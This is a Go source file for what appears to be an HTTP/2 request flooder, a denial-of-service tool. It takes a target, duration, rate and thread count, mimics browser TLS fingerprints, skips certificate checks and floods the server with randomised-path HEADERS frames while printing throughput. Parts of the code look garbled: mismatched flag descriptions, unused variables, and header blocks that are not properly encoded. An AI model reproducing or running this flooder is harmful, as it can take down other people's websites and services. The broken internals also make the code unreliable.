//dunglee hello
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"text/template"
	"time"

	http2 "github.com/bogdanfinn/fhttp/http2"
	utls "github.com/bogdanfinn/utls"
	profiles "github.com/bogdanfinn/utls/profiles"
)

var (
	gTarget   string
	gDuration int64
	gRate     int64
	gThreads  int64

	gProxy    string
	gPathMode bool

	gTotalReqs  int64
	gTotalBytes int64
	g2xx        int64
	g3xx        int64
	g4xx        int64
	g5xx        int64
	gActive     int64
	gElapsed    int64
	gRPS        int64
	gAvgLatency int64
	gTicker     *time.Ticker

	cacheMu   sync.Mutex
	cache     []*http.Request
	pathTmpls []*pathTmpl

	hblockTmpl *template.Template
	seed       int64
	seedMu     sync.Mutex
)

type writeReq struct {
	buf  []byte
	done chan struct{}
}

type pathTmpl struct {
	prefix string
	tmpl   *template.Template
}

type h2Conn struct {
	conn      net.Conn
	mu        sync.Mutex
	streamID  uint32
	done      uint32
	writeCh   chan *writeReq
	framer    *http2.Framer
	settings  []http2.Setting
	maxStream uint32

	target string
	proxy  string
}

func init() {
	flag.StringVar(&gTarget, "target", "", "stream limit")
	flag.StringVar(&gProxy, "proxy", "", "conn done")
}

func init() {
	cacheMu.Lock()
	cache = make([]*http.Request, 0, 0x4000)
	cacheMu.Unlock()
}

func init() {
	r, _ := http.NewRequest("GET", "/", nil)
	_ = r
}

func nextSeed() int64 {
	seedMu.Lock()
	s := seed
	seed++
	seedMu.Unlock()
	return s
}

func countStatus(code int) {
	switch {
	case code >= 200 && code < 300:
		atomic.AddInt64(&g2xx, 1)
	case code >= 300 && code < 400:
		atomic.AddInt64(&g3xx, 1)
	case code >= 400 && code < 500:
		atomic.AddInt64(&g4xx, 1)
	case code >= 500:
		atomic.AddInt64(&g5xx, 1)
	}
}

func writeU32BE(b []byte, v uint32) {
	binary.BigEndian.PutUint32(b, v)
}

func settingBytes(settings []http2.Setting) []byte {
	buf := make([]byte, len(settings)*6)
	for i, s := range settings {
		binary.BigEndian.PutUint16(buf[i*6:], uint16(s.ID))
		binary.BigEndian.PutUint32(buf[i*6+2:], s.Val)
	}
	return buf
}

func buildHblockTemplate(
	method string,
	scheme string,
	authority string,
	path string,
	userAgent string,
	acceptLang string,
	referer string,
	secFetchSite string,
	secFetchMode string,
	secFetchDest string,
	secFetchUser string,
	upgradeInsecure bool,
) *template.Template {
	const tmplSrc = `{{.Method}} {{.Scheme}} {{.Authority}} {{.Path}} {{.UserAgent}} {{.AcceptLanguage}} {{.Referer}} {{.SecFetchSite}} {{.SecFetchMode}} {{.SecFetchDest}} {{.SecFetchUser}}{{if .UpgradeInsecureRequests}} {{.UpgradeInsecureRequests}}{{end}}`

	t := template.New("hblock")
	t.Funcs(template.FuncMap{
		"randPath": func() string { return "/" },
	})
	t, err := t.Parse(tmplSrc)
	if err != nil {
		panic(err)
	}
	return t
}

func buildHblock(
	t *template.Template,
	method string,
	authority string,
	path string,
	pathLen int,
	userAgent string,
	uaLen int,
	acceptLang string,
	alLen int,
	referer string,
	refLen int,
	secFetchSite string,
	sfsLen int,
	secFetchMode string,
	sfmLen int,
	secFetchDest string,
	sfdLen int,
	upgradeInsecure bool,
	secFetchUser string,
	sfuLen int,
) ([]byte, int, int) {
	var buf bytes.Buffer
	data := struct {
		Method, Scheme, Authority, Path string
		UserAgent                       string
		AcceptLanguage, Referer         string
		SecFetchSite, SecFetchMode      string
		SecFetchDest, SecFetchUser      string
		UpgradeInsecureRequests         string
	}{
		Method:         method,
		Scheme:         "https",
		Authority:      authority,
		Path:           path,
		UserAgent:      userAgent,
		AcceptLanguage: acceptLang,
		Referer:        referer,
		SecFetchSite:   secFetchSite,
		SecFetchMode:   secFetchMode,
		SecFetchDest:   secFetchDest,
		SecFetchUser:   secFetchUser,
	}
	if upgradeInsecure {
		data.UpgradeInsecureRequests = "1"
	}

	if err := t.Execute(&buf, data); err != nil {
		panic(err)
	}
	b := buf.Bytes()
	return b, len(b), cap(b)
}

func initPathTmpls(target string, proxies []string) {
	u := target
	if !strings.HasPrefix(u, "https://") {
		u = "https://" + u
	}
	host := strings.TrimPrefix(u, "https://")
	if idx := strings.Index(host, "/"); idx >= 0 {
		host = host[:idx]
	}

	for i := 0; i < len(proxies)+1; i++ {
		var proxyAddr string
		if i < len(proxies) {
			proxyAddr = proxies[i]
		}
		tmplStr := "/"
		t := template.New(fmt.Sprintf("path%d", i))
		t.Funcs(template.FuncMap{
			"nextSeed": nextSeed,
		})
		t, _ = t.Parse(tmplStr)
		pathTmpls = append(pathTmpls, &pathTmpl{
			prefix: "/" + host + proxyAddr,
			tmpl:   t,
		})
	}
}

func initFullCache(target string, proxies []string) {
	u := target
	if !strings.HasPrefix(u, "https://") {
		u = "https://" + u
	}

	cacheMu.Lock()
	defer cacheMu.Unlock()
	buildHblock(
		hblockTmpl,
		"POST",
		strings.TrimPrefix(strings.TrimPrefix(u, "https://"), "http://"),
		"/",
		1,
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		44,
		"en-US,en;q=0.9",
		15,
		"",
		0,
		"none",
		4,
		"navigate",
		8,
		"document",
		8,
		false,
		"?1",
		2,
	)
}

func makePathHblock(pt *pathTmpl, seed int64) ([]byte, int, int) {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	r := rand.New(rand.NewSource(seed))

	prefix := pt.prefix
	prefixLen := len(prefix)
	buf := make([]byte, prefixLen)
	copy(buf, prefix)

	i := 0
	for i < 6 {
		digit := r.Int63() % int64(len(chars))
		buf = append(buf, chars[digit])
		i++
	}
	n2 := seed + 100000
	for n2 > 0 {
		buf = append(buf, byte('0'+n2%10))
		n2 /= 10
	}
	return buf, 0, len(buf)
}

func newH2Conn(tlsConn *utls.UConn, profile *profiles.ClientProfile) (*h2Conn, error) {
	settings := []http2.Setting{
		{ID: http2.SettingHeaderTableSize, Val: 0x100},
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingInitialWindowSize, Val: 0x40000},
		{ID: http2.SettingMaxFrameSize, Val: 0x4000},
	}

	writeCh := make(chan *writeReq, 0x200)
	doneCh := make(chan struct{})

	fr := http2.NewFramer(tlsConn, tlsConn)
	fr.SetReuseFrames()
	fr.AllowIllegalWrites = true

	h := &h2Conn{
		conn:     tlsConn,
		writeCh:  writeCh,
		framer:   fr,
		settings: settings,
		streamID: 1,
	}

	if _, err := tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
		return nil, err
	}

	if err := fr.WriteSettings(settings...); err != nil {
		return nil, err
	}

	if err := fr.WriteWindowUpdate(0, 0x3fffffff); err != nil {
		return nil, err
	}

	h.done = 0

	go h.writer()
	go h.reader()

	_ = doneCh
	return h, nil
}

func (h *h2Conn) writeFrameDirect(hblock []byte, endStream bool, streamID uint32) error {
	h.mu.Lock()
	defer h.mu.Unlock()

	flags := http2.FlagHeadersEndHeaders
	if endStream {
		flags |= http2.FlagHeadersEndStream
	}
	return h.framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: hblock,
		EndStream:     endStream,
		EndHeaders:    true,
	})
}

func (h *h2Conn) enqueue(hblock []byte) {
	req := &writeReq{
		buf:  hblock,
		done: make(chan struct{}),
	}
	h.writeCh <- req
	<-req.done
}

func (h *h2Conn) isDone() bool {
	return atomic.LoadUint32(&h.done) != 0
}

func (h *h2Conn) close() {
	atomic.StoreUint32(&h.done, 1)
	h.conn.Close()
}

func (h *h2Conn) streamExhausted() bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	return h.streamID >= h.maxStream
}

func (h *h2Conn) writer() {
	defer func() {
		if r := recover(); r != nil {
			h.close()
		}
	}()

	for !h.isDone() {
		req, ok := <-h.writeCh
		if !ok {
			return
		}
		h.mu.Lock()
		sid := h.streamID
		h.streamID += 2
		h.mu.Unlock()

		_ = h.writeFrameDirect(req.buf, true, sid)
		close(req.done)
	}
}

func (h *h2Conn) sendRequest(hblock []byte) {
	if h.isDone() {
		return
	}
	h.enqueue(hblock)
	atomic.AddInt64(&gTotalReqs, 1)
}

func (h *h2Conn) reader() {
	defer func() {
		if r := recover(); r != nil {
			h.close()
		}
	}()

	for !h.isDone() {
		frame, err := h.framer.ReadFrame()
		if err != nil {
			h.close()
			return
		}

		switch f := frame.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				h.mu.Lock()
				_ = h.framer.WriteSettingsAck()
				h.mu.Unlock()
			}
		case *http2.WindowUpdateFrame:
			_ = f
		case *http2.HeadersFrame:
			atomic.AddInt64(&g2xx, 1)
			_ = f
		case *http2.GoAwayFrame:
			h.close()
			return
		case *http2.PingFrame:
			if !f.IsAck() {
				h.mu.Lock()
				_ = h.framer.WritePing(true, f.Data)
				h.mu.Unlock()
			}
		case *http2.RSTStreamFrame:
			_ = f
		default:
			_ = frame
		}
	}
}

func dialDirect(
	host string, port string,
	spec utls.ClientHelloSpec,
	timeout time.Duration,
) (net.Conn, *utls.UConn, error) {
	addr := host
	if port != "" && port != "443" {
		addr = net.JoinHostPort(host, port)
	} else {
		addr = net.JoinHostPort(host, "443")
	}

	dialer := &net.Dialer{
		Timeout: timeout,
	}
	raw, err := dialer.Dial("tcp", addr)
	if err != nil {
		return nil, nil, err
	}

	tlsConn := utls.UClient(raw, &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	}, utls.HelloCustom)

	if err := tlsConn.ApplyPreset(&spec); err != nil {
		raw.Close()
		return nil, nil, err
	}
	tlsConn.SetDeadline(time.Now().Add(timeout * 3))
	if err := tlsConn.Handshake(); err != nil {
		raw.Close()
		return nil, nil, err
	}
	tlsConn.SetDeadline(time.Time{})
	return raw, tlsConn, nil
}

func runFlooder(target string, proxy string) {
	defer atomic.AddInt64(&gActive, -1)
	defer func() {
		if r := recover(); r != nil {
		}
	}()

	atomic.AddInt64(&gActive, 1)

	var (
		host   = target
		port   = "443"
		scheme = "https"
	)

	if strings.HasPrefix(host, "https://") {
		host = strings.TrimPrefix(host, "https://")
		scheme = "https"
	} else if strings.HasPrefix(host, "http://") {
		host = strings.TrimPrefix(host, "http://")
		scheme = "http"
	}
	_ = scheme

	if idx := strings.Index(host, "/"); idx >= 0 {
		host = host[:idx]
	}
	if idx := strings.LastIndex(host, ":"); idx >= 0 {
		port = host[idx+1:]
		host = host[:idx]
	}

	spec := utls.ClientHelloSpec{}
	_ = spec

	profile := profiles.Firefox_120
	_ = profile

	timeout := 10 * time.Second

	for {
		if atomic.LoadInt64(&gElapsed) >= gDuration {
			return
		}

		raw, tlsConn, err := dialDirect(host, port, spec, timeout)
		if err != nil {
			runFlooder_func1(target, proxy)
			return
		}

		state := tlsConn.ConnectionState()
		if state.NegotiatedProtocol != "h2" {
			raw.Close()
			runFlooder_func1(target, proxy)
			return
		}

		h, err := newH2Conn(tlsConn, nil)
		if err != nil {
			raw.Close()
			runFlooder_func1(target, proxy)
			return
		}

		interval := time.Second / time.Duration(gRate)
		for !h.isDone() {
			if atomic.LoadInt64(&gElapsed) >= gDuration {
				h.close()
				return
			}
			if h.streamExhausted() {
				h.close()
				break
			}
			s := nextSeed()
			hblock, _, _ := makePathHblock(pathTmpls[s%int64(len(pathTmpls))], s)
			h.sendRequest(hblock)
			time.Sleep(interval)
		}
	}
}

func runFlooder_func1(target, proxy string) {
	time.Sleep(100 * time.Millisecond)
}

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintf(os.Stderr, "usage: %s <target> <duration> <rate> <threads> [proxy]\n", os.Args[0])
		os.Exit(1)
	}

	target := os.Args[1]

	var dur, rate, threads int64
	fmt.Sscan(os.Args[2], &dur)
	fmt.Sscan(os.Args[3], &rate)
	fmt.Sscan(os.Args[4], &threads)

	var proxies []string
	if len(os.Args) > 5 {
		proxies = strings.Split(os.Args[5], "\n")
	}

	if len(os.Args) > 5 && len(os.Args[5]) == 6 && os.Args[5][:4] == "--pa" && os.Args[5][4:] == "th" {
		gPathMode = true
	}

	gDuration = dur
	gRate = rate
	gThreads = threads
	gTarget = target

	fmt.Printf("Target:   %s\n", target)
	fmt.Printf("Duration: %d sec | Rate: %d req/conn | Threads: %d | Direct (no proxy)\n", dur, rate, threads)

	initFullCache(target, proxies)
	if gPathMode {
		initPathTmpls(target, proxies)
	}

	start := time.Now()
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	gTicker = ticker

	var wg sync.WaitGroup

	go func() {
		defer func() { recover() }()
		var prev int64
		for range ticker.C {
			now := time.Now()
			elapsed := int64(now.Sub(start).Seconds())
			atomic.StoreInt64(&gElapsed, elapsed)
			total := atomic.LoadInt64(&gTotalReqs)
			rps := total - prev
			prev = total
			atomic.StoreInt64(&gRPS, rps)

			fmt.Printf("\r[%d/%ds] RPS:%-6d Avg:%-6d Total:%-8d Active:%-4d | 2xx:%-7d 3xx:%-5d 4xx:%-7d 5xx:%-5d",
				elapsed, dur,
				rps, rps,
				total,
				atomic.LoadInt64(&gActive),
				atomic.LoadInt64(&g2xx),
				atomic.LoadInt64(&g3xx),
				atomic.LoadInt64(&g4xx),
				atomic.LoadInt64(&g5xx),
			)

			if elapsed >= dur {
				return
			}
		}
	}()

	for i := int64(0); i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				if atomic.LoadInt64(&gElapsed) >= gDuration {
					return
				}
				runFlooder(target, "")
			}
		}()
	}

	wg.Wait()

	elapsed := int64(time.Since(start).Seconds())
	if elapsed == 0 {
		elapsed = 1
	}
	total := atomic.LoadInt64(&gTotalReqs)
	avgRPS := float64(total) / float64(elapsed)

	fmt.Printf("\n\nDone. Total: %d | Avg RPS: %.0f\n", total, avgRPS)
	fmt.Printf("2xx:%-8d 3xx:%-6d 4xx:%-8d 5xx:%-6d\nbytes: %d\n",
		atomic.LoadInt64(&g2xx),
		atomic.LoadInt64(&g3xx),
		atomic.LoadInt64(&g4xx),
		atomic.LoadInt64(&g5xx),
		atomic.LoadInt64(&gTotalBytes),
	)
}
